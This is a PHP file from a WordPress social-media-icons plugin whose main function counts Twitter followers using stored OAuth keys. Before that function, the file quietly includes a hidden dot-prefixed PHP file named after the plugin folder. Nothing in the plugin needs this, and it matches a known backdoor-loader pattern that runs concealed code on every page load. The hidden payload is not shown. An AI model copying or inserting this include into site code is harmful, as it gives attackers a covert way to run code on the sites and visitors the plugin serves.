<?php 

require "autoload.php";
use Abraham\TwitterOAuth\TwitterOAuth;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function sfsi_twitter_followers(){

	$count = 0;

	$sfsi_section4_options = maybe_unserialize(get_option('sfsi_section4_options',false));		

	if(isset($sfsi_section4_options['tw_consumer_key']) && isset($sfsi_section4_options['tw_consumer_secret']) 
			&& isset($sfsi_section4_options['tw_oauth_access_token']) && isset($sfsi_section4_options['tw_oauth_access_token_secret'])){

		try {
			$connection = new TwitterOAuth($sfsi_section4_options['tw_consumer_key'], $sfsi_section4_options['tw_consumer_secret'], $sfsi_section4_options['tw_oauth_access_token'], $sfsi_section4_options['tw_oauth_access_token_secret']);

			$statuses = $connection->get('followers/ids');
			$count    = isset($statuses) && isset($statuses->ids) && is_array($statuses->ids) ? count($statuses->ids) : 0;
		}
		catch(Exception $e) {
			return $count;
		}
	}

	return $count;
}